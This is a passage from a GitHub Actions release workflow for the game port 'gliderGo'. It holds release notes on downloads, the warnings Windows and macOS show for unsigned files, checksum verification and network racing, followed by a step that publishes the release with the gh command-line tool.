          ### Which one do I want?

          | Archive | Plays on screen? |
          |---|---|
          | `linux-amd64` | **Yes** — X11 backend, built against libX11. |
          | `windows-amd64` | **Yes** — GDI backend. `v0.1.1` was watched doing it; this release's code has been seen doing it only by a script (see below). |
          | `windows-arm64` | **Yes** — the same GDI backend, but never run on an ARM64 machine. |
          | anything marked `headless` | No. It runs the whole game but draws nothing yet. |

          macOS is stage 6. The headless builds are still useful: they run houses, take `-shot`
          screenshots and dump frames as PNGs.

          ### Your computer will try to stop you, once

          Nothing here is signed, and Windows and macOS both say so in a way that reads exactly
          like a broken download. Neither is a fault in the game and both take one click.

          **Windows: "Windows protected your PC."** A blue dialog whose only visible button says
          *Don't run*. Click **More info**, then **Run anyway** — there is no Run anyway button
          until you do. That is Microsoft Defender SmartScreen, and every unsigned program with no
          download history gets it. It stops once a file has enough of that history, and an
          unsigned file's history is its own, so every release starts again from none. A
          code-signing certificate is what lets it carry from one release to the next. One costs a
          few hundred dollars a year and has to be issued to a named person or company; that is a
          decision to make on purpose, not because a dialog was in the way.

          **Windows, the quieter half: Mark of the Web.** A zip that came from a browser is
          tagged, and extracting it in Explorer copies the tag onto every file inside — which is
          why the dialog can come back after you thought you had got past it. Right-click the zip
          *before* extracting → Properties → tick **Unblock** → OK clears it once for everything
          in it. If you have already extracted, run this in the unpacked directory:

          ```
          Get-ChildItem -Recurse | Unblock-File
          ```

          **macOS: quarantine.** A download carries `com.apple.quarantine`, and how you unpack it
          decides whether the binary inherits it. Double-clicking the `.tar.gz` in Finder hands it
          to Archive Utility, which passes the attribute on; `tar xzf` in a terminal does not,
          because the attribute is on the archive file rather than stored inside it. So unpack it
          in a terminal. If you have already met *"cannot be opened because the developer cannot
          be verified"*:

          ```
          xattr -d com.apple.quarantine glidergo
          ```

          Those three are about who signed the file, and nobody did. None of them judges what the
          program does, and `SHA256SUMS`, below, is the check on the contents. Antivirus is
          different.

          **Windows, if `glidergo.exe` disappears: Defender Antivirus.** Microsoft Defender
          Antivirus is a different part of Windows from SmartScreen, and it does not ask. If it
          decides a file is malware, it quarantines it, either as the zip is extracted or at the
          first double-click. What you see is the unpacked directory with no `glidergo.exe` in it,
          or a double-click that does nothing and a "Threats found" notification. A detection name
          ending in `!ml` is a machine-learning model's guess, not a match against known malware.
          Check the zip first. `SHA256SUMS` has a line for each archive and none for the `.exe`
          inside, so run `Get-FileHash <archive>` in PowerShell and compare it with the zip's line;
          it prints capitals where `SHA256SUMS` does not. If they match, Windows Security → Virus &
          threat protection → Protection history → the entry → **Actions** → **Restore** brings the
          file back. That needs an administrator. Then please open an issue that quotes the
          detection name exactly.

          These click paths are the documented behaviour rather than something this
          project has watched happen — it is built on an offline machine with no browser to
          download anything with — so if one of them has changed, an issue saying so will change
          this section.

          ### If you are on Windows, read this first

          Three things, all honest rather than apologetic.

          **An earlier x86-64 Windows build has been run, on Windows Server 2025 (build 26100).**
          For the first releases none had been, and this section said so: the window, the
          keyboard and the sound were all written on an offline Linux machine with no Windows to
          test on. `v0.1.1` was then run on a real interactive desktop — 4,320 frames of
          *Slumberland* across six runs, the paced one holding 29.9 fps against the original's
          30.07 target.
          The `waveOut` driver found a device and played every sound it asked for, 0 refused.
          The strongest result is that the six title screens the game renders came out
          **byte-identical** to the same version's output on Linux, and so did the window
          itself: a screenshot of the running game matches a Linux-rendered frame exactly,
          pixel for pixel.

          What that run did **not** cover, in order of how soon you will hit it: playing with a
          keyboard, touching the window, and the ARM64 build. It was driven by `-frames`, so
          nobody has yet steered a glider through a house on Windows by hand —
          `internal/platform/win32/keys.go` is still the least-exercised file here — and nothing
          resized, minimised or closed the window either. If any of that misbehaves, a bug report
          is genuinely useful. Attach `%AppData%\glidergo\crash-last.log` if the game crashed
          (the next start points at it), or the console output. `docs/windows-first-run.md` in the
          source tree is the full write-up, including the hashes and how to reproduce them.

          **This release's window code has been watched on Windows only by a script.** Since that
          run the game sizes its window to fit the monitor, centres it, and redraws only what each
          frame changed. On one player's Windows 10 laptop `v0.2.0`'s window stayed white and drew
          only what moved. This release sends the picture in pieces of 64 KiB or less and redraws
          a band of the window more each frame. A script ran a build of this code on the Windows
          Server desktop, but nobody has run it on that laptop. A window that stays white, or
          keeps strips of an old frame, is worth a bug report, and `-scale 1` looked better there.

          **Sound needs nothing installed.** The game carries its own `waveOut` driver and
          talks to Windows' audio directly — no FFmpeg, no redistributable. `-audio list` shows
          what this machine has, `-audio ffplay` uses FFmpeg instead if the driver gives you
          trouble and you have it, and `-wav out.wav` writes what you should have heard to a
          file.

          ### Running it

          Unpack it and run it, from wherever you like:

          ```
          tar xzf glidergo-VERSION-linux-amd64.tar.gz
          ./glidergo-VERSION-linux-amd64/glidergo
          ```

          Copy `glidergo` to `~/bin` and it still works — there is no asset directory to keep
          beside it, no install step and no config to write. On Windows, unzip and either
          double-click `glidergo.exe` or run `.\glidergo.exe`. Each archive has a
          `HOW-TO-RUN.txt` saying the same thing.

          `glidergo -version` lists what the binary is carrying. If you would rather play
          edited art or your own houses, `-art`, `-houses`, `-houseart`, `-sounds` and
          `-levels` each take a directory and **replace** the built-in copy rather than adding
          to it. (`-sounds` with the s is the directory; plain `-sound=false` is the 1994
          option to start with no sound at all.) `-levels` is the one to use for houses of your
          own: they list as the **New** set, so the picker keeps them apart from the 22 that
          came with the game.

          High scores and saved games go to `~/.local/share/glidergo` on Linux and
          `%AppData%\glidergo` on Windows rather than next to the binary, so they survive you
          replacing it with the next release. The same directory holds `crash.log`: what
          `-version` prints, and below it whatever stopped the last run. After a crash the next
          start keeps it as `crash-last.log` and says so.

          Linux needs glibc 2.34 or newer (Ubuntu 22.04, Debian 12, Fedora 35, RHEL 9 or
          later), libX11 at run time (`libx11-6`, present on any desktop install) and a 24- or
          32-bit display. Windows needs Windows 10 or 11, or Server 2016 or newer, and nothing
          installed — no runtime, no redistributable; an older Windows will not start it. The
          headless macOS builds need macOS 13 or newer. The Windows and macOS floors are the Go
          toolchain's, not the game's, and they rise when a release moves to a newer Go.

          ### Racing another machine

          Two machines can race the same house: **Race...** on the title screen, where one player
          hosts and the other types in the address the host's screen reads out. Two releases whose
          versions differ only in the last number always race each other. On Windows the first time
          you host, Windows Defender Firewall asks whether glidergo may use the network. Tick the
          kind of network you are on and click **Allow access**, because *Cancel* is remembered as a
          no. On one home network that is all it takes. Across the internet it needs a forwarded
          port or a VPN between the two machines. The README's *Racing beyond your network* explains
          both, and `SECURITY.md` says what a forwarded port exposes.

          ### Verifying the download

          `SHA256SUMS` covers all six archives, so tell it to ignore the five you did not
          download — otherwise it reports those as `FAILED open or read` and exits non-zero,
          which reads exactly like a corrupt download and isn't one:

          ```
          sha256sum --ignore-missing -c SHA256SUMS
          ```

          macOS has no `sha256sum`. Hash your one file with `shasum -a 256 <archive>` and
          compare the line by eye against `SHA256SUMS`. On Windows, `Get-FileHash <archive>` in
          PowerShell prints the same hash in capitals.

          ### What a person checked

          The tests cannot press keys, say whether a house is any fun, or answer a Windows
          dialog, so a person does those on a release candidate. `docs/RELEASE_TESTING.md` in the
          source says what was checked, on which build, and what was not. For `v0.2.0` and
          `v0.2.1` nothing on that list was checked, because both tags went ahead without it.

          ### Licence

          GPLv2, inherited from Calhoun's own source release. The art, sounds and houses are
          his and his house authors'; see `GliderPRO/README.md` in any archive for the credits.

          The Go runtime and standard library compiled into `glidergo` and `glidertool` are
          BSD-3-Clause, © The Go Authors; every release archive carries their licence as
          `THIRD-PARTY-NOTICES.txt`. This release was built with BUILTWITHGO, the standard
          library it carries is the game's only third-party code, and `govulncheck` found
          nothing in it that the game calls. `go version -m glidergo` says the same of the
          binary you have.
          HEADER
          sed -i "s/VERSION/${VERSION}/g; s/BUILTWITHGO/${BUILTWITHGO}/g" notes.md
          echo '--- notes.md ---'; cat notes.md

      # `gh` is preinstalled on GitHub-hosted runners, so this needs no third-party action --
      # which matters for a project whose whole premise is that it has no dependencies. It also
      # means there is no marketplace action in the supply chain of a signed release.
      #
      # --verify-tag refuses to invent a tag that does not exist. Without it a typo in a
      # protected-branch setup can create one.
      #
      # Attach-if-it-exists rather than create-or-die, because `gh release create` fails on an
      # existing tag and two ordinary routes arrive here with one already made. Publishing
      # through the Releases UI creates the tag, which fires this workflow, which then spends
      # half an hour building archives only to refuse to attach them; and the header above tells
      # you to rehearse with a throwaway tag, so deleting and re-pushing it hits the same wall.
      # Either way the archives would survive only as a 14-day run artifact for somebody to
      # upload by hand. Notes written in the UI are left alone -- a human who typed them meant
      # them, and this job has nothing better to say.
      - name: Create or update the release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ needs.build.outputs.version }}
        run: |
          set -euo pipefail
          if gh release view "$VERSION" >/dev/null 2>&1; then
            echo "release $VERSION already exists -- attaching the archives, leaving its notes as they are"
            gh release upload "$VERSION" dist/* --clobber
          else
            prerelease=""
            case "$VERSION" in *-rc*|*-alpha*|*-beta*|*-test*) prerelease="--prerelease" ;; esac
            gh release create "$VERSION" \
              --title "gliderGo $VERSION" \
              --notes-file notes.md \
              --verify-tag \
              $prerelease \
              dist/*
          fi
          gh release view "$VERSION" --json tagName,isPrerelease,assets \
            --jq '"published \(.tagName) prerelease=\(.isPrerelease) assets=\(.assets|length)"'
